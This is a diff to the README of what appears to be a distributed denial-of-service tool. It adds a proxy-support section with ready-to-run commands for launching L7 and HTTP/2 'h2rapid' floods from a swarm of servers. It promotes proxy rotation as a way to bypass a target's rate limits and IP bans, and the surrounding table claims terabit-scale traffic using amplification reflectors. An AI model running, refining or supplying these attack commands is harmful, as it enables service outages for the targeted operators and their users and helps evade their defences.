@@ -87,6 +87,33 @@ python3 swarm.py --servers servers.txt --target example.com -p 443 -c 500 -d 300
 | 53 | 500 | 26,500 | 53 Gbps |
 | 53 | 500 + amp lists | 26,500 | Tbps (with reflectors) |
 
+
+
+## Proxy support
+
+Supports HTTP and SOCKS5 proxies. Format: `IP:PORT` or `user:pass@IP:PORT` or `socks5://IP:PORT`.
+
+```bash
+# create proxies.txt
+cat > proxies.txt <<'EOF'
+1.2.3.4:8080
+user:pass@5.6.7.8:3128
+socks5://9.10.11.12:1080
+EOF
+
+# use proxies locally
+python3 godstress.py example.com -p 443 -c 1000 -d 300 -m l7 --proxies proxies.txt --ssl --confirm
+
+# use proxies on swarm (uploads proxies.txt to all nodes)
+python3 swarm.py --servers servers.txt --target example.com -p 443 -c 500 -d 300   -m http h2rapid --proxies proxies.txt --ssl --confirm
+```
+
+### Power with proxies
+- Rotates source IP per request
+- Bypasses IP-based rate limits
+- Bypasses IP bans
+- Each proxy = new source IP for the target
+
 ## Install
 
 ```bash
